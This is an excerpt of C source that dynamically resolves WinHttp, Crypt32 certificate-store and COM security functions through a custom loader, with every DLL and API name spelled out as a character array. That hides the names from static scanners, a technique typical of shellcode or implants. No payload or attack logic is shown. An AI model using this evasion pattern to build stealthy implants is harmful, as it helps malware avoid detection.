...
ptrWinHttpQueryDataAvailable	lpWinHttpQueryDataAvailable;
ptrWinHttpReceiveResponse		lpWinHttpReceiveResponse;
ptrWinHttpWriteData				lpWinHttpWriteData;
ptrWinHttpSendRequest			lpWinHttpSendRequest;
ptrWinHttpSetOption				lpWinHttpSetOption;
ptrWinHttpOpenRequest			lpWinHttpOpenRequest;
ptrWinHttpReadData				lpWinHttpReadData;
ptrWinHttpAddRequestHeaders		lpWinHttpAddRequestHeaders;
ptrWinHttpConnect				lpWinHttpConnect;
ptrWinHttpCloseHandle			lpWinHttpCloseHandle;
ptrWinHttpOpen					lpWinHttpOpen;
ptrWinHttpSetStatusCallback		lpWinHttpSetStatusCallback;

ptrPFXImportCertStore				lpPFXImportCertStore;
ptrCertEnumCertificatesInStore		lpCertEnumCertificatesInStore;
ptrCertDuplicateCertificateContext	lpCertDuplicateCertificateContext;
ptrCertCloseStore					lpCertCloseStore;
ptrCertFreeCertificateContext		lpCertFreeCertificateContext;

ptrCoCreateInstance					lpCoCreateInstance;
ptrCoInitializeEx			lpCoInitializeEx;
ptrCoInitializeSecurity		lpCoInitializeSecurity;
ptrCoSetProxyBlanket		lpCoSetProxyBlanket;
ptrCoUninitialize			lpCoUninitialize;
...
int getBaseApi(HMODULE* kernel32, FARPROC* getprocaddr, FARPROC* loadlib) {
#ifndef _WIN32
...
int getapi() {
	...
	getBaseApi(&lpDllKernel32,(FARPROC*)&lpGetProcAddress, (FARPROC*)&lpLoadLibraryA);
...
// 	MessageBoxA(0, info, info, MB_OK);
	...
	HMODULE lpDllWs2_32 = lpLoadLibraryA(szDllWs2_32);
	...
	char szDllWinHttp[] = { 'W','i','n','h','t','t','p','.','d','l','l',0 };

	HMODULE lpDllWinHttp = lpLoadLibraryA(szDllWinHttp);

	char szWinHttpQueryDataAvailable[] = 
	{ 'W','i','n','H','t','t','p','Q','u','e','r','y','D','a','t','a','A','v','a','i','l','a','b','l','e',0 };
	char szWinHttpReceiveResponse[] = { 'W','i','n','H','t','t','p','R','e','c','e','i','v','e','R','e','s','p','o','n','s','e',0 };
	char szWinHttpWriteData[] = { 'W','i','n','H','t','t','p','W','r','i','t','e','D','a','t','a',0 };
	char szWinHttpSendRequest[] = { 'W','i','n','H','t','t','p','S','e','n','d','R','e','q','u','e','s','t',0 };
	char szWinHttpSetOption[] = { 'W','i','n','H','t','t','p','S','e','t','O','p','t','i','o','n',0 };
	char szWinHttpOpenRequest[] = { 'W','i','n','H','t','t','p','O','p','e','n','R','e','q','u','e','s','t',0 };
	char szWinHttpReadData[] = { 'W','i','n','H','t','t','p','R','e','a','d','D','a','t','a',0 };
	char szWinHttpAddRequestHeaders[] =
	{ 'W','i','n','H','t','t','p','A','d','d','R','e','q','u','e','s','t','H','e','a','d','e','r','s',0 };
	char szWinHttpConnect[] = { 'W','i','n','H','t','t','p','C','o','n','n','e','c','t',0 };
	char szWinHttpCloseHandle[] = { 'W','i','n','H','t','t','p','C','l','o','s','e','H','a','n','d','l','e',0 };
	char szWinHttpOpen[] = { 'W','i','n','H','t','t','p','O','p','e','n',0 };
	char szWinHttpSetStatusCallback[] = 
	{ 'W','i','n','H','t','t','p','S','e','t','S','t','a','t','u','s','C','a','l','l','b','a','c','k',0 };
	lpWinHttpSetStatusCallback = (ptrWinHttpSetStatusCallback)lpGetProcAddress(lpDllWinHttp, szWinHttpSetStatusCallback);
	lpWinHttpQueryDataAvailable = (ptrWinHttpQueryDataAvailable)lpGetProcAddress(lpDllWinHttp, szWinHttpQueryDataAvailable);
	lpWinHttpReceiveResponse = (ptrWinHttpReceiveResponse)lpGetProcAddress(lpDllWinHttp, szWinHttpReceiveResponse);
	lpWinHttpWriteData = (ptrWinHttpWriteData)lpGetProcAddress(lpDllWinHttp, szWinHttpWriteData);
	lpWinHttpSendRequest = (ptrWinHttpSendRequest)lpGetProcAddress(lpDllWinHttp, szWinHttpSendRequest);
	lpWinHttpSetOption = (ptrWinHttpSetOption)lpGetProcAddress(lpDllWinHttp, szWinHttpSetOption);

	lpWinHttpOpenRequest = (ptrWinHttpOpenRequest)lpGetProcAddress(lpDllWinHttp, szWinHttpOpenRequest);

	lpWinHttpReadData = (ptrWinHttpReadData)lpGetProcAddress(lpDllWinHttp, szWinHttpReadData);
	lpWinHttpAddRequestHeaders = (ptrWinHttpAddRequestHeaders)lpGetProcAddress(lpDllWinHttp, szWinHttpAddRequestHeaders);
	lpWinHttpConnect = (ptrWinHttpConnect)lpGetProcAddress(lpDllWinHttp, szWinHttpConnect);
	lpWinHttpCloseHandle = (ptrWinHttpCloseHandle)lpGetProcAddress(lpDllWinHttp, szWinHttpCloseHandle);
	lpWinHttpOpen = (ptrWinHttpOpen)lpGetProcAddress(lpDllWinHttp, szWinHttpOpen);

	char szCrypt32[] = { 'C','r','y','p','t','3','2','.','d','l','l',0 };
	HMODULE hdllCrypt = lpLoadLibraryA(szCrypt32);

	char szPFXImportCertStore[] = { 'P' ,'F','X','I','m','p','o','r','t','C','e','r','t','S','t','o','r','e',0 };
	char szCertEnumCertificatesInStore[] = 
	{ 'C','e','r','t','E','n','u','m','C','e','r','t','i','f','i','c','a','t','e','s','I','n','S','t','o','r','e',0 };
	char szCertDuplicateCertificateContext[] = 
	{ 'C','e','r','t','D','u','p','l','i','c','a','t','e','C','e','r','t','i','f','i','c','a','t','e','C','o','n','t','e','x','t',0 };
	char szCertCloseStore[] = { 'C','e','r','t','C','l','o','s','e','S','t','o','r','e',0 };
	char szCertFreeCertificateContext[] = 
	{ 'C','e','r','t','F','r','e','e','C','e','r','t','i','f','i','c','a','t','e','C','o','n','t','e','x','t',0 };

	lpPFXImportCertStore = (ptrPFXImportCertStore)lpGetProcAddress(hdllCrypt, szPFXImportCertStore);
	lpCertEnumCertificatesInStore = (ptrCertEnumCertificatesInStore)lpGetProcAddress(hdllCrypt, szCertEnumCertificatesInStore);
	lpCertDuplicateCertificateContext = (ptrCertDuplicateCertificateContext)lpGetProcAddress(hdllCrypt,szCertDuplicateCertificateContext);
	lpCertCloseStore = (ptrCertCloseStore)lpGetProcAddress(hdllCrypt, szCertCloseStore);
	lpCertFreeCertificateContext = (ptrCertFreeCertificateContext)lpGetProcAddress(hdllCrypt, szCertFreeCertificateContext);

	char szOle32[] = { 'o','l','e','3','2','.','d','l','l',0 };
	char szCoInitializeEx[] = { 'C','o','I','n','i','t','i','a','l','i','z','e','E','x',0 };
	char szCoInitializeSecurity[] = { 'C','o','I','n','i','t','i','a','l','i','z','e','S','e','c','u','r','i','t','y',0 };
	char szCoSetProxyBlanket[] = { 'C','o','S','e','t','P','r','o','x','y','B','l','a','n','k','e','t',0 };
	char szCoUninitialize[] = { 'C','o','U','n','i','n','i','t','i','a','l','i','z','e',0 };

	char szCoCreateInstance[] = { 'C','o','C','r','e','a','t','e','I','n','s','t','a','n','c','e',0 };
	HMODULE hOle21 = lpLoadLibraryA(szOle32);
	lpCoCreateInstance = (ptrCoCreateInstance)lpGetProcAddress(hOle21, szCoCreateInstance);
	lpCoInitializeEx = (ptrCoInitializeEx)lpGetProcAddress(hOle21, szCoInitializeEx);
	lpCoInitializeSecurity = (ptrCoInitializeSecurity)lpGetProcAddress(hOle21, szCoInitializeSecurity);
	lpCoSetProxyBlanket = (ptrCoSetProxyBlanket)lpGetProcAddress(hOle21, szCoSetProxyBlanket);
	lpCoUninitialize = (ptrCoUninitialize)lpGetProcAddress(hOle21, szCoUninitialize);
